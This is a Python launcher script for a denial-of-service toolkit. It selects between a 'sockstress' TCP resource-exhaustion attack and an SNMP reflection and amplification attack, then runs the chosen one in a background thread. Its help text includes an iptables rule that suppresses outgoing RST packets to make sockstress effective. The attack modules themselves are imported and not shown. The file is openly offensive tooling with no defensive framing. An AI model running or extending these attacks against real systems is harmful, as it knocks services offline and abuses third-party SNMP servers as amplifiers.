#!/usr/bin/python3

import argparse
import threading
import common

parser = argparse.ArgumentParser(description='various dos attack,only support ipv4',
                                 formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('attack_type', metavar='attack_type', type=str, nargs='?',
                    help=
                    """
                    dos attack type. now support : 
                    
                    sockstress : (complete tcp handshake to exhaust the target resource,need iptables drop rst packet:
                            iptables -A OUTPUT -p tcp -d ${target_ip} --dport ${target_port} --tcp-flags ALL RST -j DROP )
                            
                    snmp_ref : (snmp reflection and amplification dos attack)
                    """)

parser.add_argument('--hh', dest="detail", help="attack type help", action='store_true')

args, _ = parser.parse_known_args()


def init():
    common.print_sub_help = args.detail


def main():
    global args

    init()

    if args.attack_type == "sockstress":

        import sockstress
        sockstress.init()
        run = sockstress.run


    elif args.attack_type == "snmp_ref":
        import snmp_reflection
        snmp_reflection.init()
        run = snmp_reflection.run


    else:
        print("unknow attack type %s" % args.attack_type)
        exit(-1)

    threading.Thread(target=run, daemon=True).start()
    print("running,press enter to exit")
    input()
    exit(0)


if __name__ == "__main__":
    main()
